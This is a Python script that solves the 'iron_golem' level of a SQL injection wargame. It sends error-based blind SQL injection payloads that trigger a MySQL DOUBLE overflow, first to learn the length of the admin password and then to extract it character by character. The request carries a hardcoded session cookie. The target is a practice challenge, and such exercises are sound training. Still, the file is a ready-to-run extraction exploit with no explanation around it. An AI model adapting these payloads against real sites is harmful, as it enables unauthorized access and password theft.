import urllib.request
from urllib.parse import quote

key = ""
i=1
pwlen = 0

while i :
    url = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw="
    data = "' or id='admin' and if((length(pw)='{}'),9e307*2,0)#".format(str(i))
    print(data)
    
    data = quote(data)
    re = urllib.request.Request(url + data)
    re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
    re.add_header("Cookie", "PHPSESSID=4csf3od9cfat47akhjak8okpi6")

    response = urllib.request.urlopen(re)

    if str(response.read()).find("DOUBLE value is out of range") != -1:
        pwlen = i
        print('pw length : ' + str(pwlen))
        break   
    i+=1    

for i in range(1, pwlen + 1):
    for j in range(32, 127):
        url = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw="
        data = "' or id='admin' and if((substr(pw, 1, {})='{}'),9e307*2,0)#".format(str(i), key + chr(j))
        print(data)

        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=4csf3od9cfat47akhjak8okpi6")

        req = urllib.request.urlopen(re)

        if str(req.read()).find("DOUBLE value is out of range") != -1:
            key += chr(j).lower()
            print(key)
            break
print(key)